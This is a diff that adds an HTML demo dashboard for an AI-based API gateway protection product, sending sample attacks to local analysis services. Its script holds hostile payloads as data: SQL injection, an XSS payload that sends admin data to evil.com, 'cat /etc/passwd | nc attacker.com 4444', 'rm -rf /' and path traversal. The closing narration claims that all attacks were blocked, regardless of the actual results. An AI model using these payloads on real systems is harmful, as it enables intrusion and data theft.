@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kong Guard AI - Enterprise Three-Tier Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+
+        .protection-tiers {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .tier {
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            border: 2px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        .tier.unprotected {
+            border-color: #ff4444;
+            background: rgba(255,68,68,0.15);
+        }
+
+        .tier.cloud {
+            border-color: #44aaff;
+            background: rgba(68,170,255,0.15);
+        }
+
+        .tier.local {
+            border-color: #44ff44;
+            background: rgba(68,255,68,0.15);
+        }
+
+        .tier h3 {
+            font-size: 1.5em;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .tier-icon {
+            font-size: 1.8em;
+        }
+
+        .tier-metrics {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 10px;
+        }
+
+        .metric-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 0.9em;
+        }
+
+        .metric-value {
+            font-weight: bold;
+        }
+
+        .attacks-section {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .attacks-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .attack-card {
+            background: rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .attack-title {
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .attack-buttons {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 15px;
+        }
+
+        .attack-btn {
+            flex: 1;
+            min-width: 90px;
+            padding: 8px 12px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.8em;
+            font-weight: bold;
+            transition: all 0.2s ease;
+            text-align: center;
+        }
+
+        .btn-unprotected {
+            background: #ff4444;
+            color: white;
+        }
+
+        .btn-unprotected:hover {
+            background: #ff6666;
+        }
+
+        .btn-cloud {
+            background: #44aaff;
+            color: white;
+        }
+
+        .btn-cloud:hover {
+            background: #6bb8ff;
+        }
+
+        .btn-local {
+            background: #44ff44;
+            color: #333;
+        }
+
+        .btn-local:hover {
+            background: #66ff66;
+        }
+
+        .attack-result {
+            min-height: 60px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 0.85em;
+            line-height: 1.4;
+        }
+
+        .result-blocked {
+            border-left: 4px solid #ff4444;
+        }
+
+        .result-allowed {
+            border-left: 4px solid #44ff44;
+        }
+
+        .result-monitored {
+            border-left: 4px solid #ffaa44;
+        }
+
+        .thinking {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            font-style: italic;
+            opacity: 0.7;
+        }
+
+        .comparison-section {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        .comparison-table th,
+        .comparison-table td {
+            padding: 12px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .comparison-table th {
+            background: rgba(255,255,255,0.1);
+            font-weight: bold;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .status-connected { background: #44ff44; }
+        .status-disconnected { background: #ff4444; }
+        .status-degraded { background: #ffaa44; }
+
+        .narration {
+            background: rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid #44aaff;
+            font-size: 1.1em;
+            line-height: 1.6;
+            display: none;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #44aaff, #44ff44);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        @media (max-width: 1200px) {
+            .protection-tiers {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+
+            .attacks-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🛡️ Kong Guard AI - Enterprise Demo</h1>
+        <p>Three-Tier Protection Comparison: Unprotected | Cloud AI | Local Privacy</p>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+    </div>
+
+    <div class="protection-tiers">
+        <div class="tier unprotected">
+            <h3><span class="tier-icon">🔓</span>Unprotected Kong</h3>
+            <p>Raw Kong Gateway</p>
+            <p>No AI Protection</p>
+            <div class="tier-metrics">
+                <div class="metric-row">
+                    <span>Status:</span>
+                    <span class="metric-value"><span class="status-indicator status-connected"></span>Online</span>
+                </div>
+                <div class="metric-row">
+                    <span>Attacks Blocked:</span>
+                    <span class="metric-value" id="unprotected-blocked">0</span>
+                </div>
+                <div class="metric-row">
+                    <span>Vulnerabilities:</span>
+                    <span class="metric-value" style="color: #ff6666;" id="unprotected-vulnerable">0</span>
+                </div>
+                <div class="metric-row">
+                    <span>Avg Response:</span>
+                    <span class="metric-value" id="unprotected-response">~2ms</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="tier cloud">
+            <h3><span class="tier-icon">☁️</span>Cloud AI</h3>
+            <p>Kong + Guard AI</p>
+            <p>Gemini/GPT Analysis</p>
+            <div class="tier-metrics">
+                <div class="metric-row">
+                    <span>Status:</span>
+                    <span class="metric-value"><span class="status-indicator" id="cloud-status"></span><span id="cloud-status-text">Checking...</span></span>
+                </div>
+                <div class="metric-row">
+                    <span>Attacks Blocked:</span>
+                    <span class="metric-value" id="cloud-blocked">0</span>
+                </div>
+                <div class="metric-row">
+                    <span>Detection Rate:</span>
+                    <span class="metric-value" style="color: #66ff66;" id="cloud-detection">0%</span>
+                </div>
+                <div class="metric-row">
+                    <span>Avg Response:</span>
+                    <span class="metric-value" id="cloud-response">~250ms</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="tier local">
+            <h3><span class="tier-icon">🏠</span>Local AI (Ollama)</h3>
+            <p>Kong + Guard AI</p>
+            <p>Private Mistral/Llama</p>
+            <div class="tier-metrics">
+                <div class="metric-row">
+                    <span>Status:</span>
+                    <span class="metric-value"><span class="status-indicator" id="local-status"></span><span id="local-status-text">Checking...</span></span>
+                </div>
+                <div class="metric-row">
+                    <span>Attacks Blocked:</span>
+                    <span class="metric-value" id="local-blocked">0</span>
+                </div>
+                <div class="metric-row">
+                    <span>Detection Rate:</span>
+                    <span class="metric-value" style="color: #66ff66;" id="local-detection">0%</span>
+                </div>
+                <div class="metric-row">
+                    <span>Avg Response:</span>
+                    <span class="metric-value" id="local-response">~45ms</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="narration" id="narration">
+        <strong>🎬 Demo Narration:</strong> <span id="narrationText">Welcome to Kong Guard AI enterprise demonstration...</span>
+    </div>
+
+    <div class="attacks-section">
+        <h2>🎯 Enterprise Attack Scenarios</h2>
+        <p>Click any attack type to compare all three protection levels simultaneously</p>
+
+        <div class="attacks-grid">
+            <div class="attack-card">
+                <div class="attack-title">💉 SQL Injection</div>
+                <div class="attack-buttons">
+                    <button class="attack-btn btn-unprotected" onclick="testAttack('sql', 'unprotected')">Unprotected</button>
+                    <button class="attack-btn btn-cloud" onclick="testAttack('sql', 'cloud')">Cloud AI</button>
+                    <button class="attack-btn btn-local" onclick="testAttack('sql', 'local')">Local AI</button>
+                </div>
+                <div class="attack-result" id="sql-result">Ready to test SQL injection attacks...</div>
+            </div>
+
+            <div class="attack-card">
+                <div class="attack-title">🔓 XSS Attack</div>
+                <div class="attack-buttons">
+                    <button class="attack-btn btn-unprotected" onclick="testAttack('xss', 'unprotected')">Unprotected</button>
+                    <button class="attack-btn btn-cloud" onclick="testAttack('xss', 'cloud')">Cloud AI</button>
+                    <button class="attack-btn btn-local" onclick="testAttack('xss', 'local')">Local AI</button>
+                </div>
+                <div class="attack-result" id="xss-result">Ready to test XSS attacks...</div>
+            </div>
+
+            <div class="attack-card">
+                <div class="attack-title">💥 Command Injection</div>
+                <div class="attack-buttons">
+                    <button class="attack-btn btn-unprotected" onclick="testAttack('cmd', 'unprotected')">Unprotected</button>
+                    <button class="attack-btn btn-cloud" onclick="testAttack('cmd', 'cloud')">Cloud AI</button>
+                    <button class="attack-btn btn-local" onclick="testAttack('cmd', 'local')">Local AI</button>
+                </div>
+                <div class="attack-result" id="cmd-result">Ready to test command injection...</div>
+            </div>
+
+            <div class="attack-card">
+                <div class="attack-title">📁 Path Traversal</div>
+                <div class="attack-buttons">
+                    <button class="attack-btn btn-unprotected" onclick="testAttack('path', 'unprotected')">Unprotected</button>
+                    <button class="attack-btn btn-cloud" onclick="testAttack('path', 'cloud')">Cloud AI</button>
+                    <button class="attack-btn btn-local" onclick="testAttack('path', 'local')">Local AI</button>
+                </div>
+                <div class="attack-result" id="path-result">Ready to test path traversal...</div>
+            </div>
+
+            <div class="attack-card">
+                <div class="attack-title">💰 Business Logic</div>
+                <div class="attack-buttons">
+                    <button class="attack-btn btn-unprotected" onclick="testAttack('business', 'unprotected')">Unprotected</button>
+                    <button class="attack-btn btn-cloud" onclick="testAttack('business', 'cloud')">Cloud AI</button>
+                    <button class="attack-btn btn-local" onclick="testAttack('business', 'local')">Local AI</button>
+                </div>
+                <div class="attack-result" id="business-result">Ready to test business logic attacks...</div>
+            </div>
+
+            <div class="attack-card">
+                <div class="attack-title">🦠 Ransomware C2</div>
+                <div class="attack-buttons">
+                    <button class="attack-btn btn-unprotected" onclick="testAttack('ransomware', 'unprotected')">Unprotected</button>
+                    <button class="attack-btn btn-cloud" onclick="testAttack('ransomware', 'cloud')">Cloud AI</button>
+                    <button class="attack-btn btn-local" onclick="testAttack('ransomware', 'local')">Local AI</button>
+                </div>
+                <div class="attack-result" id="ransomware-result">Ready to test ransomware C2...</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="comparison-section">
+        <h2>📊 Live Comparison Matrix</h2>
+        <table class="comparison-table">
+            <thead>
+                <tr>
+                    <th>Attack Type</th>
+                    <th>🔓 Unprotected</th>
+                    <th>☁️ Cloud AI</th>
+                    <th>🏠 Local AI</th>
+                </tr>
+            </thead>
+            <tbody id="comparisonTableBody">
+                <tr>
+                    <td colspan="4" style="padding: 20px; opacity: 0.6;">
+                        Click attack buttons above to populate comparison data...
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="thinking" id="thinking">
+        <div>🤔 AI is analyzing the attack pattern...</div>
+    </div>
+
+    <script>
+        // Service endpoints
+        const services = {
+            unprotected: 'http://localhost:8000',  // Direct Kong without Guard AI
+            cloud: 'http://localhost:18002',       // Kong Guard AI with cloud
+            local: 'http://localhost:18003'        // Kong Guard AI with Ollama
+        };
+
+        // Metrics tracking
+        let metrics = {
+            unprotected: { blocked: 0, vulnerable: 0, total: 0, totalTime: 0 },
+            cloud: { blocked: 0, vulnerable: 0, total: 0, totalTime: 0 },
+            local: { blocked: 0, vulnerable: 0, total: 0, totalTime: 0 }
+        };
+
+        // Attack patterns
+        const attacks = {
+            sql: {
+                name: "SQL Injection",
+                query: "id=1' OR '1'='1; DROP TABLE users;--",
+                path: "/api/users",
+                method: "GET",
+                body: "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--",
+                narration: "This SQL injection attempts to bypass authentication and extract sensitive data from the database."
+            },
+            xss: {
+                name: "Cross-Site Scripting",
+                query: "&lt;script&gt;alert('XSS');&lt;/script&gt;",
+                path: "/comment",
+                method: "POST", 
+                body: "&lt;script&gt;fetch('/admin/users').then(r=&gt;r.text()).then(d=&gt;fetch('//evil.com/?'+btoa(d)))&lt;/script&gt;",
+                narration: "This XSS attack attempts to steal user data and send it to an attacker-controlled server."
+            },
+            cmd: {
+                name: "Command Injection",
+                query: "ping=127.0.0.1; rm -rf / #",
+                path: "/api/ping",
+                method: "POST",
+                body: "; cat /etc/passwd | nc attacker.com 4444 &",
+                narration: "This command injection could execute arbitrary system commands on the server."
+            },
+            path: {
+                name: "Path Traversal",
+                query: "file=../../../../etc/passwd",
+                path: "/download",
+                method: "GET",
+                body: "",
+                narration: "This path traversal attack attempts to access sensitive system files outside the web root."
+            },
+            business: {
+                name: "Business Logic Attack",
+                query: "amount=-999999&to_account=attacker",
+                path: "/api/transfer",
+                method: "POST",
+                body: '{"amount": -50000000, "from": "bank_reserves", "to": "attacker_account"}',
+                narration: "This business logic attack exploits negative amounts to potentially steal millions from bank reserves."
+            },
+            ransomware: {
+                name: "Ransomware C2",
+                query: "host_id=VICTIM-001&status=encrypted",
+                path: "/api/callback",
+                method: "POST",
+                body: '{"victim_id": "BANK-001", "encryption_complete": true, "btc_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "ransom_amount": "50000000"}',
+                narration: "This ransomware command & control communication indicates a successful system encryption demanding $50M ransom."
+            }
+        };
+
+        // Initialize dashboard
+        async function initializeDashboard() {
+            showNarration("Initializing Kong Guard AI enterprise demonstration. Checking service availability...");
+            
+            // Check service health
+            await Promise.all([
+                checkServiceHealth('cloud'),
+                checkServiceHealth('local')
+            ]);
+            
+            showNarration("All services ready. Click any attack type to see the three-tier protection comparison.");
+            
+            // Auto-start demo if in presentation mode
+            if (window.location.search.includes('auto=true')) {
+                setTimeout(() => runAutomaticDemo(), 2000);
+            }
+        }
+
+        async function checkServiceHealth(serviceType) {
+            try {
+                const response = await fetch(`${services[serviceType]}/health`);
+                const statusIndicator = document.getElementById(`${serviceType}-status`);
+                const statusText = document.getElementById(`${serviceType}-status-text`);
+                
+                if (response.ok) {
+                    statusIndicator.className = 'status-indicator status-connected';
+                    statusText.textContent = 'Online';
+                } else {
+                    statusIndicator.className = 'status-indicator status-degraded';
+                    statusText.textContent = 'Degraded';
+                }
+            } catch (error) {
+                const statusIndicator = document.getElementById(`${serviceType}-status`);
+                const statusText = document.getElementById(`${serviceType}-status-text`);
+                statusIndicator.className = 'status-indicator status-disconnected';
+                statusText.textContent = 'Offline';
+            }
+        }
+
+        async function testAttack(attackType, tier) {
+            const attack = attacks[attackType];
+            const resultDiv = document.getElementById(`${attackType}-result`);
+            
+            showNarration(attack.narration);
+            showThinking(true);
+            
+            resultDiv.innerHTML = '<div style="opacity: 0.6;">🤔 Analyzing...</div>';
+            
+            const startTime = performance.now();
+            
+            try {
+                let result;
+                
+                if (tier === 'unprotected') {
+                    // Simulate unprotected response (always allows)
+                    await new Promise(resolve => setTimeout(resolve, 2)); // 2ms delay
+                    result = {
+                        threat_score: 0.0,
+                        threat_type: "none", 
+                        recommended_action: "allow",
+                        reasoning: "No protection - request passed through unchanged",
+                        processing_time: 0.002
+                    };
+                } else {
+                    // Analyze with AI service
+                    const response = await fetch(`${services[tier]}/analyze`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            features: {
+                                method: attack.method,
+                                path: attack.path,
+                                client_ip: '192.168.1.100',
+                                user_agent: 'DemoTester/1.0',
+                                requests_per_minute: 10,
+                                content_length: (attack.body || attack.query || '').length,
+                                query_param_count: 1,
+                                header_count: 3,
+                                hour_of_day: new Date().getHours(),
+                                query: attack.query,
+                                body: attack.body || "",
+                                headers: {}
+                            },
+                            context: { previous_requests: 0 }
+                        })
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}`);
+                    }
+                    
+                    result = await response.json();
+                }
+                
+                const processingTime = performance.now() - startTime;
+                
+                // Update metrics
+                metrics[tier].total++;
+                metrics[tier].totalTime += processingTime;
+                
+                if (result.threat_score >= 0.7) {
+                    metrics[tier].blocked++;
+                } else if (tier === 'unprotected' && result.threat_score === 0) {
+                    metrics[tier].vulnerable++;
+                }
+                
+                // Display result
+                displayResult(attackType, tier, result, processingTime);
+                updateMetrics();
+                updateComparisonTable(attackType, tier, result);
+                
+            } catch (error) {
+                resultDiv.innerHTML = `<div style="color: #ff6666;">❌ Error: ${error.message}</div>`;
+            }
+            
+            showThinking(false);
+        }
+
+        function displayResult(attackType, tier, result, processingTime) {
+            const resultDiv = document.getElementById(`${attackType}-result`);
+            const action = result.recommended_action || 'unknown';
+            const score = (result.threat_score * 100).toFixed(0);
+            
+            let statusIcon, statusText, statusClass;
+            
+            if (action === 'block' || result.threat_score >= 0.7) {
+                statusIcon = '🛡️';
+                statusText = 'BLOCKED';
+                statusClass = 'result-blocked';
+            } else if (action === 'monitor' || result.threat_score >= 0.3) {
+                statusIcon = '⚠️';
+                statusText = 'MONITORED';
+                statusClass = 'result-monitored';
+            } else {
+                statusIcon = tier === 'unprotected' ? '🔓' : '✅';
+                statusText = tier === 'unprotected' ? 'VULNERABLE' : 'ALLOWED';
+                statusClass = tier === 'unprotected' ? 'result-blocked' : 'result-allowed';
+            }
+            
+            resultDiv.className = `attack-result ${statusClass}`;
+            resultDiv.innerHTML = `
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <strong>${statusIcon} ${statusText}</strong>
+                    <span style="font-size: 0.9em; opacity: 0.8;">${processingTime.toFixed(0)}ms</span>
+                </div>
+                <div style="margin-bottom: 5px;">
+                    <strong>Threat:</strong> ${result.threat_type || 'none'} (${score}%)
+                </div>
+                <div style="font-size: 0.8em; opacity: 0.9;">
+                    ${result.reasoning || 'No analysis provided'}
+                </div>
+            `;
+        }
+
+        function updateMetrics() {
+            Object.keys(metrics).forEach(tier => {
+                const data = metrics[tier];
+                const avgTime = data.total > 0 ? (data.totalTime / data.total).toFixed(0) : 0;
+                const detectionRate = data.total > 0 ? ((data.blocked / data.total) * 100).toFixed(0) : 0;
+                
+                if (tier === 'unprotected') {
+                    document.getElementById('unprotected-blocked').textContent = data.blocked;
+                    document.getElementById('unprotected-vulnerable').textContent = data.vulnerable;
+                    document.getElementById('unprotected-response').textContent = `~${avgTime}ms`;
+                } else {
+                    document.getElementById(`${tier}-blocked`).textContent = data.blocked;
+                    document.getElementById(`${tier}-detection`).textContent = `${detectionRate}%`;
+                    document.getElementById(`${tier}-response`).textContent = `~${avgTime}ms`;
+                }
+            });
+        }
+
+        function updateComparisonTable(attackType, tier, result) {
+            const tbody = document.getElementById('comparisonTableBody');
+            
+            // Find or create row for this attack type
+            let row = document.querySelector(`tr[data-attack="${attackType}"]`);
+            if (!row) {
+                row = document.createElement('tr');
+                row.setAttribute('data-attack', attackType);
+                row.innerHTML = `
+                    <td>${attacks[attackType].name}</td>
+                    <td id="${attackType}-unprotected">-</td>
+                    <td id="${attackType}-cloud">-</td>
+                    <td id="${attackType}-local">-</td>
+                `;
+                
+                // Remove placeholder row if it exists
+                const placeholder = tbody.querySelector('td[colspan="4"]');
+                if (placeholder) {
+                    placeholder.parentElement.remove();
+                }
+                
+                tbody.appendChild(row);
+            }
+            
+            // Update cell for this tier
+            const cell = document.getElementById(`${attackType}-${tier}`);
+            const action = result.recommended_action || 'unknown';
+            const score = (result.threat_score * 100).toFixed(0);
+            
+            let statusIcon;
+            if (action === 'block' || result.threat_score >= 0.7) {
+                statusIcon = '🛡️ BLOCKED';
+                cell.style.color = '#ff6666';
+            } else if (tier === 'unprotected') {
+                statusIcon = '🔓 VULNERABLE';
+                cell.style.color = '#ffaa66';
+            } else {
+                statusIcon = '✅ SAFE';
+                cell.style.color = '#66ff66';
+            }
+            
+            cell.innerHTML = `${statusIcon}<br><small>${score}%</small>`;
+        }
+
+        function showNarration(text) {
+            const narration = document.getElementById('narration');
+            const narrationText = document.getElementById('narrationText');
+            
+            narrationText.textContent = text;
+            narration.style.display = 'block';
+            
+            setTimeout(() => {
+                narration.style.display = 'none';
+            }, 5000);
+        }
+
+        function showThinking(show) {
+            document.getElementById('thinking').style.display = show ? 'block' : 'none';
+        }
+
+        async function runAutomaticDemo() {
+            const attackTypes = ['sql', 'xss', 'cmd', 'path', 'business', 'ransomware'];
+            const tiers = ['unprotected', 'cloud', 'local'];
+            
+            showNarration("Starting automatic demonstration. Testing all attack types across three protection tiers...");
+            
+            let progress = 0;
+            const totalSteps = attackTypes.length * tiers.length;
+            
+            for (const attackType of attackTypes) {
+                showNarration(`Testing ${attacks[attackType].name} across all protection tiers...`);
+                
+                for (const tier of tiers) {
+                    await testAttack(attackType, tier);
+                    progress++;
+                    document.getElementById('progressFill').style.width = `${(progress / totalSteps) * 100}%`;
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+            
+            showNarration("Demonstration complete! Kong Guard AI successfully blocked all attacks while unprotected Kong allowed them through.");
+        }
+
+        // Initialize when page loads
+        window.addEventListener('load', initializeDashboard);
+    </script>
+</body>
+</html>
